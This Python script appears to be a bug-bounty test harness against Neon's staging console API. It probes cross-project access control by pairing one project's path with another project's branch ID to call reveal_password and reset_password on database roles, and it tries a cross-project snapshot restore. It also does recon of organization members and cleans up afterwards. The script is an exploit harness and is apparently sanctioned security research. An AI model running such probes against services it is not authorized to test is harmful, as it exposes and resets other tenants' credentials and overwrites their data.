# -*- coding: utf-8 -*-
"""Neon staging S3 mop-up:
 A. recon: shared projects / org members / branch roles
 B. roles cross-project: path(PA) + branch of PB -> reveal_password / reset_password
 C. restore one-step variant: target=PB temp branch + finalize_restore=true
 D. consumption endpoints shape check
 E. cleanup temp resources
"""
import json
import os
import time
import ssl
import http.client
import uuid
import sys

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PB = "damp-term-63384673"
PBMAIN = "br-raspy-band-w247957z"
ORG = "org-flat-dawn-91601224"
STATE_F = r"F:\scan\neon_report\_s3_state.json"
LOG = r"F:\scan\neon_report\_s3_out.jsonl"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def log(key, st, out, note=""):
    rec = {"t": time.strftime("%H:%M:%S"), "key": key, "st": st, "note": note,
           "body": (out or "")[:1500]}
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    print("[%s] %-48s -> %s %s" % (rec["t"], key, st, note), flush=True)
    if isinstance(st, int) and 400 <= st < 600:
        try:
            e = json.loads(out)
            print("        code=%s msg=%s" % (e.get("code"), e.get("message", "")[:200]),
                  flush=True)
        except Exception:
            print("        raw:", (out or "")[:200], flush=True)


def call(method, path, body=None, timeout=30):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def save_state():
    with open(STATE_F, "w", encoding="utf-8") as fh:
        json.dump(STATE, fh, ensure_ascii=False, indent=1)


def load_state():
    if os.path.exists(STATE_F):
        with open(STATE_F, encoding="utf-8") as fh:
            return json.load(fh)
    return {}


def wait_ready(pid, bid, tries=20, gap=3):
    for _ in range(tries):
        st, out = call("GET", "/projects/%s/branches/%s" % (pid, bid))
        if st == 200:
            b = json.loads(out).get("branch", {})
            if b.get("pending_state") == "ready" or \
                    (b.get("current_state") == "ready" and b.get("pending_state") is None):
                return True
        time.sleep(gap)
    return False


def stA_recon():
    for key, path in (
        ("shared projects", "/projects/shared"),
        ("my orgs", "/users/me/organizations"),
        ("org members", "/organizations/%s/members" % ORG),
    ):
        st, out = call("GET", path)
        log("A recon %s" % key, st, out)
    for pid, tag in ((PA, "PA"), (PB, "PB")):
        st, out = call("GET", "/projects/%s/branches/%s/roles" % (pid,
                        "br-wandering-field-w2ob6mpn" if pid == PA else PBMAIN))
        log("A roles %s main" % tag, st, out)
        if st == 200:
            roles = json.loads(out).get("roles", [])
            STATE["role_%s" % tag] = roles[0].get("name") if roles else None
            save_state()
            print("      roles:", [r.get("name") for r in roles], flush=True)
    STATE["stage"] = 1
    save_state()


def stB_roles_cross():
    role = STATE.get("role_PB") or "neondb_owner"
    # PB main branch roles via PA path (cross-project branch reference)
    st, out = call("GET", "/projects/%s/branches/%s/roles/%s/reveal_password"
                   % (PA, PBMAIN, role))
    log("B reveal path(PA)+brB_main", st, out[:800])
    st, out = call("POST", "/projects/%s/branches/%s/roles/%s/reset_password"
                   % (PA, PBMAIN, role), {})
    log("B reset path(PA)+brB_main", st, out[:800])
    # branch id belongs to PB but project in path belongs to PA; also try endpoints-likes
    st, out = call("GET", "/projects/%s/branches/%s/roles/%s/reveal_password"
                   % (PB, "br-wandering-field-w2ob6mpn", STATE.get("role_PA") or "neondb_owner"))
    log("B reveal path(PB)+brA_main", st, out[:800])
    STATE["stage"] = 2
    save_state()


def stC_restore_onestep():
    tag = STATE["tag"]
    # fresh temp branches
    st, out = call("POST", "/projects/%s/branches" % PB,
                   {"branch": {"name": "s3-%s-tb" % tag, "parent_id": PBMAIN}})
    log("C create brTb(PB)", st, out)
    brTb = json.loads(out).get("branch", {}).get("id") if st in (200, 201) else None
    if not brTb:
        return
    STATE["brTb"] = brTb
    save_state()
    wait_ready(PB, brTb)
    st, out = call("POST", "/projects/%s/branches" % PA,
                   {"branch": {"name": "s3-%s-ta" % tag,
                               "parent_id": "br-wandering-field-w2ob6mpn"}})
    log("C create brTa(PA)", st, out)
    brTa = json.loads(out).get("branch", {}).get("id") if st in (200, 201) else None
    if brTa:
        STATE["brTa"] = brTa
        save_state()
        wait_ready(PA, brTa)
        st, out = call("POST", "/projects/%s/branches/%s/snapshot?name=s3-%s-sid"
                       % (PA, brTa, tag))
        log("C create sidT(PA)", st, out)
        sidT = json.loads(out).get("snapshot", {}).get("id") if st == 200 else None
        if sidT:
            STATE["sidT"] = sidT
            save_state()
            time.sleep(2)
            # one-step restore, cross-project target
            st, out = call("POST", "/projects/%s/snapshots/%s/restore" % (PA, sidT),
                           {"target_branch_id": brTb, "finalize_restore": True})
            log("C one-step restore target=brTb(PB) finalize=true", st, out)
    STATE["stage"] = 3
    save_state()


def stD_consumption():
    for key, path in (
        ("D consumption v1", "/consumption_history/projects?project_id=%s" % PA),
        ("D consumption v2 proj", "/consumption_history/v2/projects?project_id=%s" % PA),
        ("D consumption v2 branch", "/consumption_history/v2/branches?project_id=%s"
         % PA),
        ("D consumption v2 branch param", "/consumption_history/v2/branches?project_id=%s"
         "&branch_id=%s" % (PA, "br-wandering-field-w2ob6mpn")),
    ):
        st, out = call("GET", path)
        log(key, st, out[:600])
    STATE["stage"] = 4
    save_state()


def stE_cleanup():
    for pid, key in ((PB, "brTb"), (PA, "brTa")):
        bid = STATE.get(key)
        if bid:
            st, out = call("DELETE", "/projects/%s/branches/%s" % (pid, bid))
            log("E cleanup %s" % key, st, out)
            time.sleep(2)
    if STATE.get("sidT"):
        st, out = call("DELETE", "/projects/%s/snapshots/%s" % (PA, STATE["sidT"]))
        log("E cleanup sidT", st, out)
    STATE["stage"] = 5
    save_state()


def main():
    global STATE
    STATE = load_state()
    if not STATE:
        STATE = {"tag": "s3" + uuid.uuid4().hex[:4], "stage": 0}
        save_state()
    print("== S3 resume: stage=%s tag=%s" % (STATE.get("stage"), STATE.get("tag")),
          flush=True)
    stages = {0: stA_recon, 1: stB_roles_cross, 2: stC_restore_onestep,
              3: stD_consumption, 4: stE_cleanup}
    s = STATE.get("stage", 0)
    while s in stages:
        try:
            stages[s]()
            s = STATE["stage"]
        except Exception as ex:
            log("FATAL stage %s" % s, -1, str(ex)[:500])
            sys.exit(2)
    print("== DONE stage=%s" % STATE.get("stage"), flush=True)


if __name__ == "__main__":
    main()
